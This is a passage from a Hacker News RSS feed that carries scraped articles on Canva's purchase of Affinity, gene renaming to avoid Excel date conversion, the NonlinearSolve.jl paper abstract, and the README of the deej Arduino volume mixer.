<div id="readability-page-1" class="page"><div><p>(Bloomberg) -- Canva Inc. acquired the Affinity suite of creative software popular with Mac and iPad users, securing a major acquisition to compete with Adobe Inc.</p><p>Most Read from Bloomberg</p><ul><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-25/trump-bond-reduced-to-175-million-as-he-appeals-ny-fine?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Trump Vows to Pay Fraud Trial Bond Cut by 68% to $175 Million;elm:context_link;itc:0;sec:content-canvas">Trump Vows to Pay Fraud Trial Bond Cut by 68% to $175 Million</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-25/donald-trump-6-4-billion-net-worth-makes-him-one-of-world-s-richest-people?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Trump’s Net Worth Hits $6.5 Billion, Making Him One of World’s 500 Richest People;elm:context_link;itc:0;sec:content-canvas">Trump’s Net Worth Hits $6.5 Billion, Making Him One of World’s 500 Richest People</a></p></li><li><p><a href="https://www.bloomberg.com/opinion/articles/2024-03-25/after-exposing-realtors-eliminate-the-mortgage-interest-deduction?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:After Exposing Realtors, Eliminate the Mortgage Interest Deduction;elm:context_link;itc:0;sec:content-canvas">After Exposing Realtors, Eliminate the Mortgage Interest Deduction</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-25/boeing-ceo-calhoun-commercial-head-deal-to-step-down?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Boeing CEO to Step Down in Overhaul Sparked by Safety Crisis;elm:context_link;itc:0;sec:content-canvas">Boeing CEO to Step Down in Overhaul Sparked by Safety Crisis</a></p></li></ul><p>The deal marks a milestone for an Australian startup last valued at $26 billion. By adding the 90-person team of Nottingham, UK-based Serif, Canva is augmenting a portfolio of artificial intelligence-powered design tools with photo-editing, publishing and illustration software. Affinity’s apps have been featured in Apple Inc.’s presentations of creative products.</p><p>Founded about a decade ago, Canva has grown into the most capable competitor to Adobe, the longtime dominant provider of software for graphics professionals. Adobe has added AI features throughout its products recently, but its shares have fallen about 15% this year after a $20 billion deal to acquire Figma fell through in December.</p><p>Investors have long viewed Canva as a candidate to go public, though the company hasn’t discussed plans for doing so. The company recently completed a share sale valuing it at around $26 billion.</p><p>Read More: Canva Unveils AI Design Tools as Competition From Adobe Heats Up</p><p>The startup, which has focused on making easy-to-use products targeted at people without formal design training, surpassed $2 billion in annualized revenue in 2023 and has over 175 million users. It added over 90 million new users over the past 18 months, helped by new AI features.</p><p>The Australian upstart has acquired six other companies in Europe, including visual AI startup Kaleido.ai and image providers Pexels and Pixabay, as it looks to expand its presence on the continent.</p><p>Most Read from Bloomberg Businessweek</p><ul><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-25/hong-kong-retirees-choose-mainland-retirement-homes?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Hong Kong’s Elderly Increasingly Opt to Retire in Mainland China;elm:context_link;itc:0;sec:content-canvas">Hong Kong’s Elderly Increasingly Opt to Retire in Mainland China</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-21/ozempic-wegovy-cost-drives-weight-loss-patients-to-pricey-off-ramp?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Weight-Loss-Drug Users Pay Up for Help Ditching the Pricey Meds;elm:context_link;itc:0;sec:content-canvas">Weight-Loss-Drug Users Pay Up for Help Ditching the Pricey Meds</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-21/nvidia-meta-stock-gains-turn-magnificent-seven-into-two?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Magnificent Seven? It’s More Like the Blazing Two and Tepid Five;elm:context_link;itc:0;sec:content-canvas">Magnificent Seven? It’s More Like the Blazing Two and Tepid Five</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-21/billionares-musk-griffin-ellison-embrace-trump-and-chaos?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Wall Street and Silicon Valley Elites Are Warming Up to Trump;elm:context_link;itc:0;sec:content-canvas">Wall Street and Silicon Valley Elites Are Warming Up to Trump</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-03-22/business-schools-still-lag-on-diversity-despite-stated-goals?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Business Schools Still Lag on Diversity, Despite Stated Goals;elm:context_link;itc:0;sec:content-canvas">Business Schools Still Lag on Diversity, Despite Stated Goals</a></p></li></ul><p>©2024 Bloomberg L.P.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Scientists rename genes to stop Microsoft Excel from misreading them as dates (145 pts)]]></title>
            <link>https://www.theverge.com/2020/8/6/21355674/human-genes-rename-microsoft-excel-misreading-dates</link>
            <guid>39824100</guid>
            <pubDate>Tue, 26 Mar 2024 03:47:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/2020/8/6/21355674/human-genes-rename-microsoft-excel-misreading-dates">https://www.theverge.com/2020/8/6/21355674/human-genes-rename-microsoft-excel-misreading-dates</a>, See on <a href="https://news.ycombinator.com/item?id=39824100">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><p><em><strong>Update October 24th, 2023, 11:25AM ET:</strong> Microsoft </em><a href="https://www.theverge.com/2023/10/21/23926585/microsoft-excel-misreading-dates-human-genes-conversion-fixed"><em>has updated Excel on Windows and macOS</em></a>,<em> adding a toggle to </em><a href="https://insider.microsoft365.com/en-us/blog/control-data-conversions-in-excel-for-windows-and-mac"><em>turn off automatic data conversion</em></a><em>. The original version of this article continues below.</em></p></div><p>There are tens of thousands of genes in the human genome: minuscule twists of DNA and RNA that combine to express all of the traits and characteristics that make each of us unique. Each gene is given a name and alphanumeric code, known as a symbol, which scientists use to coordinate research. But over the past year or so, some 27 human genes have been renamed, all because Microsoft Excel kept misreading their symbols as dates.</p><p>The problem isn’t as unexpected as it first sounds. Excel is a behemoth in the spreadsheet world and is regularly used by scientists to track their work and even conduct clinical trials. But its default settings were designed with more mundane applications in mind, so when a user inputs a gene’s alphanumeric symbol into a spreadsheet, like MARCH1 — short for “<a href="https://www.genenames.org/data/gene-symbol-report/#!/hgnc_id/HGNC:26077">Membrane Associated Ring-CH-Type Finger 1</a>” — Excel converts that into a date: 1-Mar. </p><div><p>Studies found a fifth of genetic data in papers was affected by Excel errors</p></div><p>This is extremely frustrating, even dangerous, corrupting data that scientists have to sort through by hand to restore. It’s also surprisingly widespread and affects even peer-reviewed scientific work. One study <a href="https://genomebiology.biomedcentral.com/articles/10.1186/s13059-016-1044-7">from 2016</a> examined genetic data shared alongside 3,597 published papers and found that roughly one-fifth had been affected by Excel errors. </p><p>“It’s really, really annoying,” Dezső Módos, a systems biologist at the Quadram Institute in the UK, told <em>The Verge</em>. Módos, whose job involves analyzing freshly sequenced genetic data, says Excel errors happen all the time, simply because the software is often the first thing to hand when scientists process numerical data. “It’s a widespread tool and if you are a bit computationally illiterate you will use it,” he says. “During my PhD studies I did as well!”</p><div><div role="button" aria-label="Zoom" tabindex="0"><figure><div><p><span><img alt="Examples of gene symbols being rendered as dates in Microsoft Excel. " loading="lazy" decoding="async" data-nimg="fill" sizes="(max-width: 1023px) 100vw, 744px" srcset="https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/376x259/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 376w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/384x265/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 384w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/415x286/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 415w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/480x331/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 480w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/540x373/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 540w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/640x442/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 640w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/750x518/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 750w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/828x571/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 828w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/1080x745/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 1080w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/1200x828/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 1200w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/1440x994/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 1440w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/1920x1325/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 1920w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/2048x1413/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 2048w, https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/2400x1656/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif 2400w" src="https://duet-cdn.vox-cdn.com/thumbor/0x0:500x345/2400x1656/filters:focal(250x173:251x174):no_upscale():format(webp)/cdn.vox-cdn.com/uploads/chorus_asset/file/21700662/excel_gene_names_111.gif" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p></div></figure></div><div><figcaption><em>Examples of gene symbols being rendered as dates in Microsoft Excel. </em></figcaption> <p><cite>GIF: The Verge</cite></p></div></div><p>There’s no easy fix, either. Excel doesn’t offer the option to turn off this auto-formatting, and the only way to avoid it is to&nbsp;<a href="https://go.redirectingat.com/?xs=1&amp;id=1025X1701640&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DSppKiKIdCkI%26feature%3Dyoutu.be">change the data type</a>&nbsp;for individual columns<em>. </em>Even then, a scientist might fix their data but export it as a CSV file without saving the formatting. Or, another scientist might load the data without the correct formatting, changing gene symbols back into dates. The end result is that while knowledgeable Excel users can avoid this problem, it’s easy for mistakes to be introduced.</p><p>Help has arrived, though, in the form&nbsp;of the scientific body in charge of standardizing the names of genes, the HUGO Gene Nomenclature Committee, or HGNC. This week, the HGNC published new <a href="https://www.nature.com/articles/s41588-020-0669-3">guidelines</a> for gene naming, including for “symbols that affect data handling and retrieval.” From now on, they say, human genes and the proteins they expressed will be named with one eye on Excel’s auto-formatting. That means the symbol MARCH1 has now become MARCHF1, while SEPT1 has become SEPTIN1, and so on. A record of old symbols and names will be stored by HGNC to avoid confusion in the future. </p><p>So far, the names of some 27 genes have been changed like this over the past year, Elspeth Bruford, the coordinator of HGNC, tells <em>The Verge, </em>but the guidelines themselves weren’t formally announced until this week. “We consulted the respective research communities to discuss the proposed updates, and we also notified researchers who had published on these genes specifically when the changes were being put into effect,” says Bruford.</p><p>As Bruford makes clear, the art of naming genes is very much driven by consensus. Like the lexicographers charged with updating dictionaries, the Gene Nomenclature Committee has to be sensitive to the needs of those individuals who will be most affected by their work.</p><p>This wasn’t always the case, mind. In the early, frontier days of genetics, gene naming was often a <a href="https://psmag.com/environment/sonic-hedgehog-dicer-problem-naming-genes-91386">playground for creative scientists</a>, leading to notorious genes like “sonic hedgehog” (yes, named for <em>that S</em>onic) and “Indy” (short for “I’m not dead yet”; a reference to the gene’s function, which can double the life span of fruit flies when mutated). </p><p>Now, though, the HGNC has taken matters firmly in hand, and current guidelines don’t cede much ground to whimsy or ego. The focus is on practical concerns: how do we minimize confusion? For that reason, gene symbols should be unique, and gene names should be brief and specific, says the committee. They cannot use subscript or superscript; can only contain Latin letters and Arabic numerals; and should not spell out names or words, particularly offensive ones (a rule that should hold true “ideally in any language”).</p><div><p>Gene names should avoid offense “ideally in any language”</p></div><p>And while the decision to rename genes is not taken lightly, it’s not unusual, says Bruford. Many gene symbols that can be read as nouns have been renamed to avoid false positives during searches, for example. In the past, CARS has become CARS1, WARS changed to WARS1, and MARS tweaked to MARS1. Other changes have been made to avoid insult. </p><p>“We always have to imagine a clinician having to explain to a parent that their child has a mutation in a particular gene,” says Bruford. “For example, HECA used to have the gene name ‘headcase homolog (Drosophila),’ named after the equivalent gene in fruit fly, but we changed it to&nbsp;‘hdc homolog, cell cycle regulator’ to avoid potential offense.”</p><p>But Bruford says this is the first time that the guidelines have been rewritten specifically to counter the problems caused by software. So far, the reactions seem to be extremely positive — some would even say joyous. </p><p>After geneticist Janna Hutz shared the relevant section of HGNC’s new guidelines on Twitter, the response from the community was jubilant. “THRILLED by this announcement by the Human Gene Nomenclature Committee,” <a href="https://twitter.com/jannahutz/status/1290666010228514824">tweeted</a> Hutz herself. “Finally!!!” <a href="https://twitter.com/HegdeMudra/status/1290969706044719104">responded</a> Mudra Hegde, a computational biologist at the Broad Institute in Massachusetts. “Greatest news of the day!” <a href="https://twitter.com/ScienceSid1/status/1290811922338676737">said</a> a pseudonymous Twitter user. </p><div><p>Why did Microsoft win in a fight against human genetics?</p></div><p>Bruford notes that there has been some dissent about the decision, but it mostly seems to be focused on a single question: why was it easier to rename human genes than it was to change how Excel works? Why, exactly, in a fight between Microsoft and the entire genetics community, was it the scientists who had to back down? </p><p>Microsoft did not respond to a request for comment, but Bruford’s theory is that it’s simply not worth the trouble to change. “This is quite a limited use case of the Excel software,” she says. “There is very little incentive for Microsoft to make a significant change to features that are used extremely widely by the rest of the massive community of Excel users.”</p><p>Bruford doesn’t seem bitter about the situation, though. After all, she says, it wouldn’t do to wait on a hypothetical Excel update to fix these problems when a long-term solution can be introduced by scientists themselves. Microsoft Excel may be fleeting, but human genes will be around for as long as we are. It’s best to give them names that work.</p><p><em><strong>Correction: </strong>The story has been corrected to clarify that Excel users can save spreadsheets that retain their formatting, avoiding the mistake where gene symbols are changed into dates. We regret the error.</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Nonlinearsolve.jl: Fast and Robust Solvers for Nonlinear Equations in Julia (133 pts)]]></title>
            <link>https://arxiv.org/abs/2403.16341</link>
            <guid>39824019</guid>
            <pubDate>Tue, 26 Mar 2024 03:27:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2403.16341">https://arxiv.org/abs/2403.16341</a>, See on <a href="https://news.ycombinator.com/item?id=39824019">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2403.16341">View PDF</a>
    <a href="https://arxiv.org/html/2403.16341v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>Efficiently solving nonlinear equations underpins numerous scientific and engineering disciplines, yet scaling these solutions for complex system models remains a challenge. This paper presents NonlinearSolve.jl - a suite of high-performance open-source nonlinear equation solvers implemented natively in the Julia programming language. NonlinearSolve.jl distinguishes itself by offering a unified API that accommodates a diverse range of solver specifications alongside features such as automatic algorithm selection based on runtime analysis, support for GPU-accelerated computation through static array kernels, and the utilization of sparse automatic differentiation and Jacobian-free Krylov methods for large-scale problem-solving. Through rigorous comparison with established tools such as Sundials and MINPACK, NonlinearSolve.jl demonstrates unparalleled robustness and efficiency, achieving significant advancements in solving benchmark problems and challenging real-world applications. The capabilities of NonlinearSolve.jl unlock new potentials in modeling and simulation across various domains, making it a valuable addition to the computational toolkit of researchers and practitioners alike.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Avik Pal [<a href="https://arxiv.org/show-email/5bb6e4fe/2403.16341">view email</a>]      <br>    <strong>[v1]</strong>
        Mon, 25 Mar 2024 00:31:21 UTC (4,909 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Deej: An open-source hardware volume mixer for Windows and Linux (154 pts)]]></title>
            <link>https://github.com/omriharel/deej</link>
            <guid>39823373</guid>
            <pubDate>Tue, 26 Mar 2024 01:29:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/omriharel/deej">https://github.com/omriharel/deej</a>, See on <a href="https://news.ycombinator.com/item?id=39823373">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">deej</h2><a id="user-content-deej" aria-label="Permalink: deej" href="#deej"></a></p>
<p dir="auto">deej is an <strong>open-source hardware volume mixer</strong> for Windows and Linux PCs. It lets you use real-life sliders (like a DJ!) to <strong>seamlessly control the volumes of different apps</strong> (such as your music player, the game you're playing and your voice chat session) without having to stop what you're doing.</p>
<p dir="auto"><strong>Join the <a href="https://discord.gg/nf88NJu" rel="nofollow">deej Discord server</a> if you need help or have any questions!</strong></p>
<p dir="auto"><a href="https://discord.gg/nf88NJu" rel="nofollow"><img src="https://camo.githubusercontent.com/21efeafcfe76a8b3c0a0e8e29f2dd89a56a54e6192f8cb0d6cef0730e9df3c5a/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3730323934303530323033383933373636373f6c6f676f3d646973636f7264" alt="Discord" data-canonical-src="https://img.shields.io/discord/702940502038937667?logo=discord"></a></p>
<blockquote>
<p dir="auto"><strong><em>New:</em></strong> <a href="https://github.com/omriharel/deej/blob/master/docs/faq/faq.md">work-in-progress deej FAQ</a>!</p>
</blockquote>
<p dir="auto">deej consists of a <a href="#features">lightweight desktop client</a> written in Go, and an Arduino-based hardware setup that's simple and cheap to build. <a href="https://github.com/omriharel/deej/blob/master/community.md"><strong>Check out some versions built by members of our community!</strong></a></p>
<p dir="auto"><strong><a href="https://github.com/omriharel/deej/releases/latest">Download the latest release</a> | <a href="https://youtu.be/VoByJ4USMr8" rel="nofollow">Video demonstration</a> | <a href="https://youtu.be/x2yXbFiiAeI" rel="nofollow">Build video by Tech Always</a></strong></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/omriharel/deej/blob/master/assets/build-3d-annotated.png"><img src="https://github.com/omriharel/deej/raw/master/assets/build-3d-annotated.png" alt="deej"></a></p>
<blockquote>
<p dir="auto"><em><strong>Psst!</strong> <a href="https://github.com/omriharel/deej/blob/master/assets/build-shoebox.jpg">No 3D printer? No problem!</a></em> You can build deej on some cardboard, a shoebox or even a breadboard :)</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">Table of contents</h2><a id="user-content-table-of-contents" aria-label="Permalink: Table of contents" href="#table-of-contents"></a></p>
<ul dir="auto">
<li><a href="#features">Features</a></li>
<li><a href="#how-it-works">How it works</a>
<ul dir="auto">
<li><a href="#hardware">Hardware</a>
<ul dir="auto">
<li><a href="#schematic">Schematic</a></li>
</ul>
</li>
<li><a href="#software">Software</a></li>
</ul>
</li>
<li><a href="#slider-mapping-configuration">Slider mapping (configuration)</a></li>
<li><a href="#build-your-own">Build your own!</a>
<ul dir="auto">
<li><a href="#faq">FAQ</a></li>
<li><a href="#build-video">Build video</a></li>
<li><a href="#bill-of-materials">Bill of Materials</a></li>
<li><a href="#thingiverse-collection">Thingiverse collection</a></li>
<li><a href="#build-procedure">Build procedure</a></li>
</ul>
</li>
<li><a href="#how-to-run">How to run</a>
<ul dir="auto">
<li><a href="#requirements">Requirements</a></li>
<li><a href="#download-and-installation">Download and installation</a></li>
<li><a href="#building-from-source">Building from source</a></li>
</ul>
</li>
<li><a href="#community">Community</a></li>
<li><a href="#license">License</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<p dir="auto">deej is written in Go and <a href="https://github.com/omriharel/deej/releases/latest">distributed</a> as a portable (no installer needed) executable.</p>
<ul dir="auto">
<li>Bind apps to different sliders
<ul dir="auto">
<li>Bind multiple apps per slider (i.e. one slider for all your games)</li>
<li>Bind the master channel</li>
<li>Bind "system sounds" (on Windows)</li>
<li>Bind specific audio devices by name (on Windows)</li>
<li>Bind currently active app (on Windows)</li>
<li>Bind all other unassigned apps</li>
</ul>
</li>
<li>Control your microphone's input level</li>
<li>Lightweight desktop client, consuming around 10MB of memory</li>
<li>Runs from your system tray</li>
<li>Helpful notifications to let you know if something isn't working</li>
</ul>
<blockquote>
<p dir="auto"><strong>Looking for the older Python version?</strong> It's no longer maintained, but you can always find it in the <a href="https://github.com/omriharel/deej/tree/legacy-python"><code>legacy-python</code> branch</a>.</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">How it works</h2><a id="user-content-how-it-works" aria-label="Permalink: How it works" href="#how-it-works"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Hardware</h3><a id="user-content-hardware" aria-label="Permalink: Hardware" href="#hardware"></a></p>
<ul dir="auto">
<li>The sliders are connected to 5 (or as many as you like) analog pins on an Arduino Nano/Uno board. They're powered from the board's 5V output (see schematic)</li>
<li>The board connects via a USB cable to the PC</li>
</ul>
<p dir="auto"><h4 tabindex="-1" dir="auto">Schematic</h4><a id="user-content-schematic" aria-label="Permalink: Schematic" href="#schematic"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/omriharel/deej/blob/master/assets/schematic.png"><img src="https://github.com/omriharel/deej/raw/master/assets/schematic.png" alt="Hardware schematic"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Software</h3><a id="user-content-software" aria-label="Permalink: Software" href="#software"></a></p>
<ul dir="auto">
<li>The code running on the Arduino board is a <a href="https://github.com/omriharel/deej/blob/master/arduino/deej-5-sliders-vanilla/deej-5-sliders-vanilla.ino">C program</a> constantly writing current slider values over its serial interface</li>
<li>The PC runs a lightweight <a href="https://github.com/omriharel/deej/blob/master/pkg/deej/cmd/main.go">Go client</a> in the background. This client reads the serial stream and adjusts app volumes according to the given configuration file</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Slider mapping (configuration)</h2><a id="user-content-slider-mapping-configuration" aria-label="Permalink: Slider mapping (configuration)" href="#slider-mapping-configuration"></a></p>
<p dir="auto">deej uses a simple YAML-formatted configuration file named <a href="https://github.com/omriharel/deej/blob/master/config.yaml"><code>config.yaml</code></a>, placed alongside the deej executable.</p>
<p dir="auto">The config file determines which applications (and devices) are mapped to which sliders, and which parameters to use for the connection to the Arduino board, as well as other user preferences.</p>
<p dir="auto"><strong>This file auto-reloads when its contents are changed, so you can change application mappings on-the-fly without restarting deej.</strong></p>
<p dir="auto">It looks like this:</p>
<div dir="auto" data-snippet-clipboard-copy-content="slider_mapping:
  0: master
  1: chrome.exe
  2: spotify.exe
  3:
    - pathofexile_x64.exe
    - rocketleague.exe
  4: discord.exe

# set this to true if you want the controls inverted (i.e. top is 0%, bottom is 100%)
invert_sliders: false

# settings for connecting to the arduino board
com_port: COM4
baud_rate: 9600

# adjust the amount of signal noise reduction depending on your hardware quality
# supported values are &quot;low&quot; (excellent hardware), &quot;default&quot; (regular hardware) or &quot;high&quot; (bad, noisy hardware)
noise_reduction: default"><pre><span>slider_mapping</span>:
  <span>0</span>: <span>master</span>
  <span>1</span>: <span>chrome.exe</span>
  <span>2</span>: <span>spotify.exe</span>
  <span>3</span>:
    - <span>pathofexile_x64.exe</span>
    - <span>rocketleague.exe</span>
  <span>4</span>: <span>discord.exe</span>

<span><span>#</span> set this to true if you want the controls inverted (i.e. top is 0%, bottom is 100%)</span>
<span>invert_sliders</span>: <span>false</span>

<span><span>#</span> settings for connecting to the arduino board</span>
<span>com_port</span>: <span>COM4</span>
<span>baud_rate</span>: <span>9600</span>

<span><span>#</span> adjust the amount of signal noise reduction depending on your hardware quality</span>
<span><span>#</span> supported values are "low" (excellent hardware), "default" (regular hardware) or "high" (bad, noisy hardware)</span>
<span>noise_reduction</span>: <span>default</span></pre></div>
<ul dir="auto">
<li><code>master</code> is a special option to control the master volume of the system <em>(uses the default playback device)</em></li>
<li><code>mic</code> is a special option to control your microphone's input level <em>(uses the default recording device)</em></li>
<li><code>deej.unmapped</code> is a special option to control all apps that aren't bound to any slider ("everything else")</li>
<li>On Windows, <code>deej.current</code> is a special option to control whichever app is currently in focus</li>
<li>On Windows, you can specify a device's full name, i.e. <code>Speakers (Realtek High Definition Audio)</code>, to bind that device's level to a slider. This doesn't conflict with the default <code>master</code> and <code>mic</code> options, and works for both input and output devices.
<ul dir="auto">
<li>Be sure to use the full device name, as seen in the menu that comes up when left-clicking the speaker icon in the tray menu</li>
</ul>
</li>
<li><code>system</code> is a special option on Windows to control the "System sounds" volume in the Windows mixer</li>
<li>All names are case-<strong>in</strong>sensitive, meaning both <code>chrome.exe</code> and <code>CHROME.exe</code> will work</li>
<li>You can create groups of process names (using a list) to either:
<ul dir="auto">
<li>control more than one app with a single slider</li>
<li>choose whichever process in the group that's currently running (i.e. to have one slider control any game you're playing)</li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Build your own!</h2><a id="user-content-build-your-own" aria-label="Permalink: Build your own!" href="#build-your-own"></a></p>
<p dir="auto">Building deej is very simple. You only need a few relatively cheap parts - it's an excellent starter project (and my first Arduino project, personally). Remember that if you need any help or have a question that's not answered here, you can always <a href="https://discord.gg/nf88NJu" rel="nofollow">join the deej Discord server</a>.</p>
<p dir="auto">Build deej for yourself, or as an awesome gift for your gaming buddies!</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">FAQ</h3><a id="user-content-faq" aria-label="Permalink: FAQ" href="#faq"></a></p>
<p dir="auto">I've started a highly focused effort of writing a proper FAQ page for deej, covering many basic and advanced topics.</p>
<p dir="auto">It is still <em>very much a work-in-progress</em>, but I'm happy to <a href="https://github.com/omriharel/deej/blob/master/docs/faq/faq.md">share it in its current state</a> in hopes that it at least covers some questions you might have.</p>
<p dir="auto">FAQ feedback in our <a href="https://discord.gg/nf88NJu" rel="nofollow">community Discord</a> is strongly encouraged :)</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Build video</h3><a id="user-content-build-video" aria-label="Permalink: Build video" href="#build-video"></a></p>
<p dir="auto">In case you prefer watching to reading, Charles from the <a href="https://www.youtube.com/c/TechAlways" rel="nofollow"><strong>Tech Always</strong></a> YouTube channel has made <a href="https://youtu.be/x2yXbFiiAeI" rel="nofollow"><strong>a fantastic video</strong></a> that covers the basics of building deej for yourself, including parts, costs, assembly and software. I highly recommend checking it out!</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Bill of Materials</h3><a id="user-content-bill-of-materials" aria-label="Permalink: Bill of Materials" href="#bill-of-materials"></a></p>
<ul dir="auto">
<li>An Arduino Nano, Pro Micro or Uno board
<ul dir="auto">
<li>I officially recommend using a Nano or a Pro Micro for their smaller form-factor, friendlier USB connectors and more analog pins. Plus they're cheaper</li>
<li>You can also use any other development board that has a Serial over USB interface</li>
</ul>
</li>
<li>A few slider potentiometers, up to your number of free analog pins (the cheaper ones cost around 1-2 USD each, and come with a standard 10K Ohm variable resistor. These <em>should</em> work just fine for this project)
<ul dir="auto">
<li><strong>Important:</strong> make sure to get <strong>linear</strong> sliders, not logarithmic ones! Check the product description</li>
<li>You can also use circular knobs if you like</li>
</ul>
</li>
<li>Some wires</li>
<li>Any kind of box to hold everything together. <strong>You don't need a 3D printer for this project!</strong> It works fantastically with just a piece of cardboard or a shoebox. That being said, if you do have one, read on...</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Thingiverse collection</h3><a id="user-content-thingiverse-collection" aria-label="Permalink: Thingiverse collection" href="#thingiverse-collection"></a></p>
<p dir="auto">With many different 3D-printed designs being added to our <a href="https://github.com/omriharel/deej/blob/master/community.md">community showcase</a>, it felt right to gather all of them in a Thingiverse collection for you to browse. If you have access to a 3D printer, feel free to use one of the designs in your build.</p>
<p dir="auto"><strong><a href="https://thingiverse.com/omriharel/collections/deej" rel="nofollow">Visit our community-created design collection on Thingiverse!</a></strong></p>
<blockquote>
<p dir="auto">You can also <a href="https://discord.gg/nf88NJu" rel="nofollow">submit your own</a> design to be added to the collection. Regardless, if you do upload your design to Thingiverse, <em>please add a <code>deej</code> tag to it so that others can find it more easily</em>.</p>
</blockquote>
